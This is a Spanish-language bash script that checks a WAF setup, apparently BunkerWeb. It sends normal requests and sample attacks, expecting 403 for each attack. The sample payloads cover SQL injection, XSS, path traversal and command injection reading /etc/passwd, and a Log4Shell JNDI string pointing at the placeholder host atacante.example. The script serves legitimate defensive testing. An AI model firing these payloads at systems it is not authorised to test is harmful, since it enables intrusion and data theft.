#!/usr/bin/env bash
# =============================================================================
#  Lanza peticiones normales y ataques de prueba contra el WAF.
#
#  Uso:
#    ./pruebas.sh                       # contra app.localhost en este equipo
#    ./pruebas.sh miapp.duckdns.org     # contra un dominio real
#    ./pruebas.sh app.localhost 1.2.3.4 # dominio + IP del servidor
#    ./pruebas.sh --baneo               # además provoca un baneo temporal
#
#  Resultado esperado: peticiones normales -> 200, ataques -> 403.
# =============================================================================
set -u

BANEO=no
ARGS=()
for a in "$@"; do
  if [ "$a" = "--baneo" ]; then BANEO=yes; else ARGS+=("$a"); fi
done

DOMINIO="${ARGS[0]:-app.localhost}"
IP="${ARGS[1]:-127.0.0.1}"
BASE="https://$DOMINIO"

# -k: acepta el certificado autofirmado   -g: no interpretar [] {} en la URL
CURL=(curl -skg -o /dev/null -w "%{http_code}" --max-time 10 --resolve "$DOMINIO:443:$IP")

VERDE=$'\e[32m'; ROJO=$'\e[31m'; NORMAL=$'\e[0m'
FALLOS=0

probar() {
  local esperado="$1" descripcion="$2"; shift 2
  local codigo
  codigo=$("${CURL[@]}" "$@")
  if [ "$codigo" = "$esperado" ]; then
    printf "  %s%-4s%s %-42s (esperado %s)\n" "$VERDE" "$codigo" "$NORMAL" "$descripcion" "$esperado"
  else
    printf "  %s%-4s%s %-42s (esperado %s)\n" "$ROJO" "$codigo" "$NORMAL" "$descripcion" "$esperado"
    FALLOS=$((FALLOS + 1))
  fi
}

echo "Objetivo: $BASE  (IP $IP)"
echo
echo "Tráfico normal"
probar 200 "Página principal"            "$BASE/"
probar 200 "Parámetro normal"            "$BASE/productos?id=5&orden=precio"

echo
echo "Ataques (deben ser bloqueados)"
probar 403 "Inyección SQL (GET)"         "$BASE/?id=1'%20OR%20'1'%3D'1"
probar 403 "Inyección SQL (POST)"        -X POST -d "usuario=admin'--&clave=x" "$BASE/login"
probar 403 "XSS"                         "$BASE/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
probar 403 "Path traversal"              "$BASE/?archivo=../../../../etc/passwd"
probar 403 "Inyección de comandos"       "$BASE/?cmd=%3Bcat%20/etc/passwd"
probar 403 "Log4Shell en cabecera"       -H 'X-Api-Version: ${jndi:ldap://atacante.example/a}' "$BASE/"
probar 403 "Escáner (User-Agent sqlmap)" -A "sqlmap/1.8" "$BASE/"

if [ "$BANEO" = "yes" ]; then
  echo
  echo "Provocando baneo por mal comportamiento (12 ataques seguidos)..."
  for _ in $(seq 1 12); do "${CURL[@]}" "$BASE/?id=1'%20OR%201=1--" > /dev/null; done
  sleep 2
  probar 403 "Petición NORMAL tras el baneo" "$BASE/"
  echo "  (El baneo dura BAD_BEHAVIOR_BAN_TIME segundos; ver .env)"
fi

echo
if [ "$FALLOS" -eq 0 ]; then
  echo "${VERDE}Todo según lo esperado.${NORMAL} Revisa el dashboard en Grafana."
else
  echo "${ROJO}$FALLOS resultado(s) distinto(s) a lo esperado.${NORMAL}"
  echo "Si todo da 403, puede que tu IP siga baneada de una prueba anterior: espera unos minutos."
  echo "Si todo da 000, BunkerWeb no está respondiendo: docker compose logs bunkerweb"
fi
